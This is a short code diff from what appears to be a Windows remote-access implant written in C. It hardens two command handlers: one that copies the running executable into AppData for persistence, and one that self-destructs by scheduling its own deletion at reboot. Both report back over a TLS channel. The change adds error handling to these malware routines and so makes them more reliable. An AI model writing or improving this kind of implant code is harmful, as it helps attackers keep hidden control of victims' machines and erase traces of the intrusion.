@@ -283,7 +283,10 @@ void _handle_persist(TLS_CONTEXT *pTls, const char *args)
     _snprintf(dst, sizeof(dst) - 1, "%s\\%s", appdata, filename);
 
     char src[MAX_PATH] = {0};
-    GetModuleFileNameA(NULL, src, sizeof(src));
+    if (GetModuleFileNameA(NULL, src, sizeof(src)) == 0) {
+        _send_str(pTls, "[-] persist: cannot resolve own EXE path");
+        return;
+    }
 
     if (GetFileAttributesA(dst) != INVALID_FILE_ATTRIBUTES) {
         _send_str(pTls, "[-] persist: already exists");
@@ -369,7 +372,10 @@ void _handle_self_destruct(TLS_CONTEXT *pTls)
     }
 
     char exePath[MAX_PATH] = {0};
-    GetModuleFileNameA(NULL, exePath, sizeof(exePath));
+    if (GetModuleFileNameA(NULL, exePath, sizeof(exePath)) == 0) {
+        _send_str(pTls, "[-] self_destruct: cannot resolve own EXE path");
+        return;
+    }
 
     /* 2. Register file for deferred deletion on next reboot (no child process) */
     MoveFileExA(exePath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
